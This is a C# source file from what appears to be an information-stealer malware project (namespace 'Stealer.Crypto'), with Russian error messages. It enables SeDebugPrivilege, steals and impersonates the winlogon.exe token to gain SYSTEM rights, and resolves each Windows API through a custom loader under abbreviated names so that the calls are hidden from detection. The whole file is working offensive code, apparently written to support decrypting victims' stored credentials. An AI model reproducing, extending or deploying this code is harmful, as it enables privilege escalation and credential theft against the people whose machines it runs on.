using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using Stealer.Utils;

namespace Stealer.Crypto
{
    public static class ImpersonationHelper
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate bool OPTDelegate(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate bool DTEDelegate(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate bool ILUDelegate(IntPtr hToken);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate bool RTSDelegate();

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Auto, SetLastError = true)]
        private delegate bool LPVDelegate(string lpSystemName, string lpName, ref LUID lpLuid);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate bool ATPDelegate(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate IntPtr GCPDelegate();

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate bool CHDelegate(IntPtr hObject);

        private static OPTDelegate _opt;
        private static DTEDelegate _dte;
        private static ILUDelegate _ilu;
        private static RTSDelegate _rts;
        private static LPVDelegate _lpv;
        private static ATPDelegate _atp;
        private static GCPDelegate _gcp;
        private static CHDelegate _ch;

        private static OPTDelegate GetOPT() { return _opt ?? (_opt = NativeLoader.Resolve<OPTDelegate>(NativeLoader.Lib_A32, NativeLoader.Fn_OPT)); }
        private static DTEDelegate GetDTE() { return _dte ?? (_dte = NativeLoader.Resolve<DTEDelegate>(NativeLoader.Lib_A32, NativeLoader.Fn_DTE)); }
        private static ILUDelegate GetILU() { return _ilu ?? (_ilu = NativeLoader.Resolve<ILUDelegate>(NativeLoader.Lib_A32, NativeLoader.Fn_ILU)); }
        private static RTSDelegate GetRTS() { return _rts ?? (_rts = NativeLoader.Resolve<RTSDelegate>(NativeLoader.Lib_A32, NativeLoader.Fn_RTS)); }
        private static LPVDelegate GetLPV() { return _lpv ?? (_lpv = NativeLoader.Resolve<LPVDelegate>(NativeLoader.Lib_A32, NativeLoader.Fn_LPV)); }
        private static ATPDelegate GetATP() { return _atp ?? (_atp = NativeLoader.Resolve<ATPDelegate>(NativeLoader.Lib_A32, NativeLoader.Fn_ATP)); }
        private static GCPDelegate GetGCP() { return _gcp ?? (_gcp = NativeLoader.Resolve<GCPDelegate>(NativeLoader.Lib_K32, NativeLoader.Fn_GCP)); }
        private static CHDelegate GetCH() { return _ch ?? (_ch = NativeLoader.Resolve<CHDelegate>(NativeLoader.Lib_K32, NativeLoader.Fn_CH)); }

        private const uint TOKEN_DUPLICATE = 2U;
        private const uint TOKEN_IMPERSONATE = 4U;
        private const uint TOKEN_QUERY = 8U;
        private const uint TOKEN_ADJUST_PRIVILEGES = 32U;
        private const uint SecurityImpersonation = 2U;
        private const uint TokenImpersonation = 2U;
        private const uint SE_PRIVILEGE_ENABLED = 2U;

        [StructLayout(LayoutKind.Sequential)]
        public struct LUID
        {
            public uint LowPart;
            public int HighPart;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct TOKEN_PRIVILEGES
        {
            public uint PrivilegeCount;
            public LUID Luid;
            public uint Attributes;
        }

        public static IDisposable ImpersonateWinlogon()
        {
            IntPtr zero = IntPtr.Zero;
            IntPtr zero2 = IntPtr.Zero;

            try
            {
                EnableDebugPrivilege();
                Process process = Process.GetProcessesByName("winlogon").FirstOrDefault<Process>();
                if (process == null)
                {
                    throw new Exception("Процесс winlogon.exe не найден");
                }

                if (!GetOPT()(process.Handle, 14U, out zero))
                {
                    throw new Win32Exception(Marshal.GetLastWin32Error(), "Ошибка OpenProcessToken");
                }

                if (!GetDTE()(zero, 12U, IntPtr.Zero, 2U, 2U, out zero2))
                {
                    throw new Win32Exception(Marshal.GetLastWin32Error(), "Ошибка DuplicateTokenEx");
                }

                if (!GetILU()(zero2))
                {
                    throw new Win32Exception(Marshal.GetLastWin32Error(), "Ошибка ImpersonateLoggedOnUser");
                }

                return new ImpersonationContext();
            }
            catch
            {
                if (zero2 != IntPtr.Zero)
                {
                    GetCH()(zero2);
                }
                if (zero != IntPtr.Zero)
                {
                    GetCH()(zero);
                }
                GetRTS()();
                throw;
            }
        }

        private static void EnableDebugPrivilege()
        {
            IntPtr zero = IntPtr.Zero;
            try
            {
                if (!GetOPT()(GetGCP()(), 40U, out zero))
                {
                    int lastWin32Error = Marshal.GetLastWin32Error();
                    throw new Win32Exception(lastWin32Error, string.Format("Ошибка OpenProcessToken: Код ошибки {0}", lastWin32Error));
                }

                LUID luid = default(LUID);
                if (!GetLPV()(null, "SeDebugPrivilege", ref luid))
                {
                    int lastWin32Error2 = Marshal.GetLastWin32Error();
                    throw new Win32Exception(lastWin32Error2, string.Format("Ошибка LookupPrivilegeValue: Код ошибки {0}", lastWin32Error2));
                }

                TOKEN_PRIVILEGES token_PRIVILEGES = new TOKEN_PRIVILEGES
                {
                    PrivilegeCount = 1U,
                    Luid = luid,
                    Attributes = 2U
                };

                if (!GetATP()(zero, false, ref token_PRIVILEGES, (uint)Marshal.SizeOf(typeof(TOKEN_PRIVILEGES)), IntPtr.Zero, IntPtr.Zero))
                {
                    int lastWin32Error3 = Marshal.GetLastWin32Error();
                    throw new Win32Exception(lastWin32Error3, string.Format("Ошибка AdjustTokenPrivileges: Код ошибки {0}", lastWin32Error3));
                }

                int lastWin32Error4 = Marshal.GetLastWin32Error();
                if (lastWin32Error4 != 0)
                {
                    throw new Win32Exception(lastWin32Error4, string.Format("AdjustTokenPrivileges вернул успех, но установил код ошибки {0}", lastWin32Error4));
                }
            }
            finally
            {
                if (zero != IntPtr.Zero)
                {
                    GetCH()(zero);
                }
            }
        }

        private class ImpersonationContext : IDisposable
        {
            public void Dispose()
            {
                GetRTS()();
            }
        }
    }
}
